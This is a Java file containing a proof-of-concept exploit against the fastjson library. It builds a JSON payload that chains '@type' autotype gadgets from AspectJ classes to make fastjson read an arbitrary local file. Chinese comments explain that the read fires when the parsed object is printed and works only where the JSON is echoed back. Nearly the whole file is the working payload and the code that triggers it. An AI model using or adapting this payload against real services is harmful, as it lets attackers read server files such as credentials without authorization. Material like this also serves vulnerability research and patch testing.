import com.alibaba.fastjson.JSON;


// 读文件
// 实用性不强
// 在JSON.parseObject()时只生成了JSON对象，并没有读文件
// 在 println(JSONObject) 的时候，调用了 JSONObject 的toString()方法，才真正的去读文件了，并且把文件内容写入到了 JSON 体中
// 只有在 JSON 体回显的情况下才可用
//
public class aspectj {
	//merge all poc
	private static String pocall = "" +
		"{\n" +
		"\t\"a\": {\n" +
		"\t\t\"@type\":\"java.lang.Exception\",\n" +
		"\t\t\"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\"\n" +
		"\t},\n" +
		"\t\"b\" : {\n" +
		"\t\t\"@type\":\"java.lang.Class\",\n" +
		"\t\t\"val\":{\n" +
		"\t\t\t\"@type\":\"java.lang.String\"{\n" +
		"\t\t\t\"@type\":\"java.util.Locale\",\n" +
		"\t\t\t\"val\":{\n" +
		"\t\t\t\t\"@type\":\"com.alibaba.fastjson.JSONObject\",{\n" +
		"\t\t\t\t\t\"@type\":\"java.lang.String\"\n" +
		"\t\t\t\t\t\"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\",\n" +
		"\t\t\t\t\t\"newAnnotationProcessorUnits\":[{}]\n" +
		"\t\t\t\t}\n" +
		"\t\t}\n" +
		"\t},\n" +
		"\t\"c\":{\n" +
		"\t\t\"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\n" +
		"\t\t\"@type\":\"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\n" +
		"\t\t\"fileName\":\"D:/Program/extractor-java-master/run.py\"\n" +
		"\t}\n" +
		"}\n";

    public static void main(String[] args) {

		System.out.println(pocall);
		System.out.println(JSON.parseObject(pocall));

    }

}
